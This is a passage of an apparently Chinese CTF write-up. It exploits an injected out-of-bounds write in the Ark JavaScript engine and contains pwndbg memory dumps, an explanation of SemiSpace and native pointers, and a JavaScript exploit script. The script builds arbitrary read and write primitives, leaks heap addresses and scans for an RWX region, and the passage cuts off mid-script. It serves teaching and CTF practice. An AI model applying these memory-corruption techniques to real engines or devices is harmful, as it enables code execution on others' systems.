class="number">0x18fff813e8</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│    <span class="number">0x243ffff458</span> —▸ <span class="number">0x18fff84088</span> —▸ <span class="number">0x18fff81288</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│    <span class="number">0x243ffff460</span> ◂— <span class="number">0x40</span> /* <span class="string">'@'</span> */</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│    <span class="number">0x243ffff468</span> ◂— <span class="number">0x200000010</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│    <span class="number">0x243ffff470</span> ◂— <span class="number">2</span></span><br><span class="line">... ↓       <span class="number">3</span> skipped</span><br><span class="line">0c:<span class="number">0060</span>│    <span class="number">0x243ffff490</span> —▸ <span class="number">0x18fff813e8</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">0d</span>:<span class="number">0068</span>│    <span class="number">0x243ffff498</span> ◂— <span class="number">0x400000010</span></span><br><span class="line">0e:<span class="number">0070</span>│    <span class="number">0x243ffff4a0</span> ◂— <span class="number">0</span></span><br><span class="line">... ↓       <span class="number">7</span> skipped</span><br><span class="line"><span class="number">16</span>:00b0│    <span class="number">0x243ffff4e0</span> —▸ <span class="number">0x18fff82200</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">17</span>:00b8│    <span class="number">0x243ffff4e8</span> —▸ <span class="number">0x243ffff430</span> —▸ <span class="number">0x18fffcba60</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">18</span>:00c0│    <span class="number">0x243ffff4f0</span> —▸ <span class="number">0x18fffcba60</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">19</span>:00c8│    <span class="number">0x243ffff4f8</span> ◂— <span class="number">0xffff000000000000</span></span><br><span class="line">1a:00d0│    <span class="number">0x243ffff500</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">1b</span>:00d8│    <span class="number">0x243ffff508</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line">1c:00e0│    <span class="number">0x243ffff510</span> —▸ <span class="number">0x243ffff550</span> —▸ <span class="number">0x18fff813e8</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">1d</span>:00e8│    <span class="number">0x243ffff518</span> —▸ <span class="number">0x18fff84088</span> —▸ <span class="number">0x18fff81288</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line">1e:00f0│    <span class="number">0x243ffff520</span> ◂— <span class="number">0x40</span> /* <span class="string">'@'</span> */</span><br><span class="line">1f:00f8│    <span class="number">0x243ffff528</span> ◂— <span class="number">0x200000010</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│    <span class="number">0x243ffff530</span> ◂— <span class="number">2</span></span><br><span class="line">... ↓       <span class="number">3</span> skipped</span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│    <span class="number">0x243ffff550</span> —▸ <span class="number">0x18fff813e8</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│    <span class="number">0x243ffff558</span> ◂— <span class="number">0x400000010</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│    <span class="number">0x243ffff560</span> ◂— <span class="number">0</span></span><br><span class="line">... ↓       <span class="number">7</span> skipped</span><br><span class="line">2e:<span class="number">0170</span>│    <span class="number">0x243ffff5a0</span> —▸ <span class="number">0x18fff82200</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line">2f:<span class="number">0178</span>│    <span class="number">0x243ffff5a8</span> —▸ <span class="number">0x243ffff4f0</span> —▸ <span class="number">0x18fffcba60</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│    <span class="number">0x243ffff5b0</span> —▸ <span class="number">0x18fffcb9b0</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│    <span class="number">0x243ffff5b8</span> ◂— <span class="number">0xffff000000000000</span></span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│    <span class="number">0x243ffff5c0</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│    <span class="number">0x243ffff5c8</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">34</span>:01a0│    <span class="number">0x243ffff5d0</span> —▸ <span class="number">0x243ffff610</span> —▸ <span class="number">0x18fffcc248</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">35</span>:01a8│    <span class="number">0x243ffff5d8</span> —▸ <span class="number">0x18fff84088</span> —▸ <span class="number">0x18fff81288</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">36</span>:01b0│    <span class="number">0x243ffff5e0</span> ◂— <span class="number">0x2000</span></span><br><span class="line"><span class="number">37</span>:01b8│    <span class="number">0x243ffff5e8</span> ◂— <span class="number">0x200000800</span></span><br><span class="line"><span class="number">38</span>:01c0│    <span class="number">0x243ffff5f0</span> ◂— <span class="number">2</span></span><br><span class="line">... ↓       <span class="number">3</span> skipped</span><br><span class="line">3c:01e0│    <span class="number">0x243ffff610</span> —▸ <span class="number">0x18fffcc248</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">3d</span>:01e8│    <span class="number">0x243ffff618</span> ◂— <span class="number">0xffff000000000000</span></span><br><span class="line">3e:01f0│    <span class="number">0x243ffff620</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line">3f:01f8│    <span class="number">0x243ffff628</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>│    <span class="number">0x243ffff630</span> —▸ <span class="number">0x243ff84a28</span> —▸ <span class="number">0x18fff010d0</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">41</span>:<span class="number">0208</span>│    <span class="number">0x243ffff638</span> ◂— <span class="number">0x200002000</span></span><br><span class="line"><span class="number">42</span>:<span class="number">0210</span>│    <span class="number">0x243ffff640</span> ◂— <span class="number">2</span></span><br><span class="line">... ↓       <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>
<p><code>0x243ffff430</code>地址是我们分配的第一个小数组<code>a</code>的地址，我们可以关注到这样一条链子：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">04</span>:<span class="number">0020</span>│    <span class="number">0</span>x243ffff450 —▸ <span class="number">0</span>x243ffff490 —▸ <span class="number">0</span>x18fff813e8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br></pre></td></tr></table></figure>
<p><code>0x243ffff490</code>就是数组<code>a</code>的<code>datapointer</code>，指向了数组<code>a</code>的数据部分，如果向数组<code>a</code>进行写入的话，数据会写入到<code>datapointer + 0x10 + idx * 4</code>的位置</p>
<p>从<code>0x243ffff4f0</code>开始是下一个小数组<code>oob1</code>的内存布局，和数组<code>a</code>的内存布局相同，<code>oob1</code>的<code>datapointer</code>是<code>0x243ffff550</code></p>
<p>同理<code>oob2</code>的<code>datapointer</code>是<code>0x243ffff610</code></p>
<p>综上，引入的<code>OOB</code>会有一个越界写，我们就可以去利用数组<code>a</code>去更改任意一个高地址数组的<code>datapointer</code>去做到任意地址写和任意地址读</p>
<p>同时我们发现，在遥远的国度（比数组a地址还低的地址）有一个堆地址！</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pwndbg</span>&gt; tele  <span class="number">0</span>x243ffff330 <span class="number">70</span></span><br><span class="line"><span class="attribute">00</span>:<span class="number">0000</span>│    <span class="number">0</span>x243ffff330 ◂— <span class="number">2</span></span><br><span class="line"><span class="attribute">01</span>:<span class="number">0008</span>│    <span class="number">0</span>x243ffff338 —▸ <span class="number">0</span>x18fff83570 —▸ <span class="number">0</span>x18fff815a0 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">02</span>:<span class="number">0010</span>│    <span class="number">0</span>x243ffff340 ◂— <span class="number">2</span></span><br><span class="line"><span class="attribute">03</span>:<span class="number">0018</span>│    <span class="number">0</span>x243ffff348 —▸ <span class="number">0</span>x243ff48e68 —▸ <span class="number">0</span>x18fff81288 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">04</span>:<span class="number">0020</span>│    <span class="number">0</span>x243ffff350 ◂— <span class="number">0</span></span><br><span class="line"><span class="attribute">05</span>:<span class="number">0028</span>│    <span class="number">0</span>x243ffff358 —▸ <span class="number">0</span>x18fff828b8 —▸ <span class="number">0</span>x18fff81ac8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">06</span>:<span class="number">0030</span>│    <span class="number">0</span>x243ffff360 —▸ <span class="number">0</span>x18fff828a0 —▸ <span class="number">0</span>x18fff81ac8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">07</span>:<span class="number">0038</span>│    <span class="number">0</span>x243ffff368 —▸ <span class="number">0</span>x18fff82888 —▸ <span class="number">0</span>x18fff81ac8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">08</span>:<span class="number">0040</span>│    <span class="number">0</span>x243ffff370 ◂— <span class="number">2</span></span><br><span class="line"><span class="attribute">09</span>:<span class="number">0048</span>│    <span class="number">0</span>x243ffff378 —▸ <span class="number">0</span>x18fff82200 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">0a</span>:<span class="number">0050</span>│    <span class="number">0</span>x243ffff380 —▸ <span class="number">0</span>x243ffff2e0 —▸ <span class="number">0</span>x18fffc33f8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">0b</span>:<span class="number">0058</span>│    <span class="number">0</span>x243ffff388 —▸ <span class="number">0</span>x18fffc33f8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">0c</span>:<span class="number">0060</span>│    <span class="number">0</span>x243ffff390 ◂— <span class="number">0</span>xffff000000000000</span><br><span class="line"><span class="attribute">0d</span>:<span class="number">0068</span>│    <span class="number">0</span>x243ffff398 —▸ <span class="number">0</span>x18fff83508 —▸ <span class="number">0</span>x18fff81128 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">0e</span>:<span class="number">0070</span>│    <span class="number">0</span>x243ffff3a0 —▸ <span class="number">0</span>x18fff83508 —▸ <span class="number">0</span>x18fff81128 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">0f</span>:<span class="number">0078</span>│    <span class="number">0</span>x243ffff3a8 —▸ <span class="number">0</span>x243ff48ef0 —▸ <span class="number">0</span>x18fff82620 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br><span class="line"><span class="attribute">10</span>:<span class="number">0080</span>│    <span class="number">0</span>x243ffff3b0 —▸ <span class="number">0</span>x57a2647d0580 ◂— <span class="number">0</span>x30000002f /* '/' */ &lt;-- !!!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果能把<code>datapointer</code>控在这里就可以泄露堆地址。现在的问题是如何找那段<code>mmap</code>的地址。</p>
<p>在遥远的国度，差不多是这个堆地址<code>+ ((0x000057f45459bf40 - 0x000057f4545389e0))</code>偏移的地方，存储着连续的<code>mmap</code>出来的地址（懒得调出来了）</p>
<p>但在打题的时候发现这个<code>datapointer</code>并不能随便指，上面的那个堆地址泄露不出来，我们可以看到原来的<code>datapointer</code>是指向了一条链子的：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">04</span>:<span class="number">0020</span>│    <span class="number">0</span>x243ffff450 —▸ <span class="number">0</span>x243ffff490 —▸ <span class="number">0</span>x18fff813e8 —▸ <span class="number">0</span>x18fff810d0 ◂— <span class="number">0</span>x18fff810d0</span><br></pre></td></tr></table></figure>
<p>同时我们注意到虽然我们<code>oob2</code>分配了0x800的空间，但是这里的<code>data</code>空间明显不够。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">37</span>:01b8│    <span class="number">0x243ffff5e8</span> ◂— <span class="number">0x200000800</span></span><br><span class="line"><span class="number">38</span>:01c0│    <span class="number">0x243ffff5f0</span> ◂— <span class="number">2</span></span><br><span class="line">... ↓       <span class="number">3</span> skipped</span><br><span class="line">3c:01e0│    <span class="number">0x243ffff610</span> —▸ <span class="number">0x18fffcc248</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">3d</span>:01e8│    <span class="number">0x243ffff618</span> ◂— <span class="number">0xffff000000000000</span></span><br><span class="line">3e:01f0│    <span class="number">0x243ffff620</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line">3f:01f8│    <span class="number">0x243ffff628</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>│    <span class="number">0x243ffff630</span> —▸ <span class="number">0x243ff84a28</span> —▸ <span class="number">0x18fff010d0</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">41</span>:<span class="number">0208</span>│    <span class="number">0x243ffff638</span> ◂— <span class="number">0x200002000</span></span><br><span class="line"><span class="number">42</span>:<span class="number">0210</span>│    <span class="number">0x243ffff640</span> ◂— <span class="number">2</span></span><br><span class="line">... ↓       <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>
<p>在翻阅手册后知道了<code>SemiSpace</code>管理空间实际上是有和<code>native</code>空间的联系的，就比如上面那个大堆块，猜测是因为<code>SemiSpace</code>空间不够，将该堆块的<code>data</code>域晋升到<code>native</code>空间。我们管<code>SemiSpace</code>指向<code>native</code>空间的指针叫<code>native_pointer</code>，这个指针包是合法的<code>datapointer</code>，所以我们可以泄露<code>native</code>地址，进而泄露<code>native_hclass</code>的地址，<code>native</code>空间下就有好多好多好多堆地址可以泄露了！</p>
<blockquote>
<p>此时oob2的 datapointer -&gt; native_pointer -&gt; real_data_seg</p>
</blockquote>
<p>现在的问题是如何泄露<code>SemiSpace</code>的指针，我们构造如上的堆块序列：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> oob1 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> oob3 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x800</span>); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">let</span> oob2 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x800</span>);</span><br></pre></td></tr></table></figure>
<p>通过<code>a</code>的<code>oob</code>覆盖<code>oob2</code>的<code>datapointer</code>与<code>oob1</code>的<code>datapointer</code>重叠，由于<code>oob2</code>有<code>0x800</code>个字节，进而可以泄露<code>oob3</code>的<code>datapointer</code>，泄露<code>SemiSpace</code></p>
<blockquote>
<p>实际上这里的覆盖是<code>half overlap</code>, 因为<code>SemiSpace</code>的高地址我们是不知道的，知道的只有低地址，附一个负数转化器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_signed_int32</span>(<span class="params">hex_str</span>):</span><br><span class="line"> <span class="string">"""将32位十六进制字符串转化为有符号十进制整数"""</span></span><br><span class="line"> num = <span class="built_in">int</span>(hex_str, <span class="number">16</span>)  <span class="comment"># 转成无符号整数</span></span><br><span class="line"> <span class="keyword">if</span> num &gt;= <span class="number">0x80000000</span>:   <span class="comment"># 如果最高位是1，说明是负数</span></span><br><span class="line">     num -= <span class="number">0x100000000</span>  <span class="comment"># 减去2^32得到有符号值</span></span><br><span class="line"> <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">hex_value = <span class="string">"0xf5500000"</span></span><br><span class="line">signed_decimal = hex_to_signed_int32(hex_value)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"<span class="subst">{hex_value}</span> -&gt; <span class="subst">{signed_decimal}</span>"</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>本题exp如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> oob1 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> oob3 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x800</span>);</span><br><span class="line"><span class="keyword">let</span> oob2 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x800</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_bak = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> idx = <span class="number">0x1f0</span> - <span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> val = -<span class="number">179306496</span>;</span><br><span class="line"><span class="keyword">let</span> ok = <span class="title class_">ArkTools</span>.<span class="title function_">oob</span>(a, idx, val);</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(<span class="string">"a"</span>, oob2)</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(<span class="string">"ark_semi_addr"</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(oob2[<span class="number">28</span>].<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(oob2[<span class="number">29</span>].<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(oob2.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> native_point_low = oob2[<span class="number">52</span>];</span><br><span class="line"><span class="keyword">let</span> native_point_high = oob2[<span class="number">53</span>];</span><br><span class="line"><span class="keyword">let</span> ark_semi_low = oob2[<span class="number">28</span>] - <span class="number">0xb0</span>;</span><br><span class="line"><span class="keyword">let</span> ark_semi_high = oob2[<span class="number">29</span>];</span><br><span class="line">oob2[<span class="number">52</span>] = ark_semi_low;</span><br><span class="line">oob2[<span class="number">53</span>] = ark_semi_high;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(<span class="string">"native_point"</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(oob2[<span class="number">52</span>].<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(oob2[<span class="number">53</span>].<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_read</span>(<span class="params">addr_high, addr_low</span>) {</span><br><span class="line">  oob2[<span class="number">2</span>] = addr_low;</span><br><span class="line">  oob2[<span class="number">3</span>] = addr_high;</span><br><span class="line">  <span class="keyword">return</span> oob3[<span class="number">0</span>]</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_write</span>(<span class="params">addr_high, addr_low, data</span>) {</span><br><span class="line">  oob2[<span class="number">2</span>] = addr_low;</span><br><span class="line">  oob2[<span class="number">3</span>] = addr_high;</span><br><span class="line">  oob3[<span class="number">0</span>] = data;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> native_hclass_low = <span class="title function_">arbitrary_read</span>(native_point_high, native_point_low);</span><br><span class="line"><span class="keyword">let</span> native_hclass_high = <span class="title function_">arbitrary_read</span>(native_point_high, native_point_low+<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(<span class="string">"native_hclass_addr"</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(native_hclass_low.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(native_hclass_high.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"></span><br><span class="line">oob1[<span class="number">0</span>] = native_hclass_low;</span><br><span class="line">oob1[<span class="number">1</span>] = native_hclass_high;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(<span class="string">"heap_addr"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> heap_low = <span class="title function_">arbitrary_read</span>(native_point_high, native_point_low+<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> heap_high = <span class="title function_">arbitrary_read</span>(native_point_high, native_point_low+<span class="number">12</span>);</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(heap_low.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(heap_high.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rwx_low = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> rwx_high = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let leak_heap_low = heap_low - (0x000057f45459bf40 - 0x000057f4545389e0)</span></span><br><span class="line"><span class="comment">// ArkTools.print(leak_heap_low.toString(16).padStart(8, '0'));</span></span><br><span class="line"><span class="comment">// ArkTools.print(heap_high.toString(16).padStart(8, '0'));</span></span><br><span class="line"><span class="comment">// let leak_addr = arbitrary_read(heap_high, leak_heap_low);</span></span><br><span class="line"><span class="comment">// rwx_low = leak_addr - 0x1070;</span></span><br><span class="line"><span class="comment">// rwx_high = arbitrary_read(heap_high, leak_heap_low + 4);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">0x100000</span> ; i++) {</span><br><span class="line">  heap_low = heap_low - <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">let</span> leak_addr = <span class="title function_">arbitrary_read</span>(heap_high, heap_low);</span><br><span class="line">  <span class="keyword">let</span> leak_addr_2 = <span class="title function_">arbitrary_read</span>(heap_high, heap_low + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (((leak_addr &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span> &amp;&amp; (leak_addr_2 &amp; <span class="number">0xfff</span>) == <span class="number">0x090</span>)){</span><br><span class="line">    rwx_low = leak_addr - <span class="number">0x1070</span>;</span><br><span class="line">    rwx_high = <span class="title function_">arbitrary_read</span>(heap_high, heap_low + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(<span class="string">"rwx_addr"</span>)</span><br><span class="line"><span class="title class_">ArkTools</span>.<span class="title function_">print</span>(rwx_low.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="title 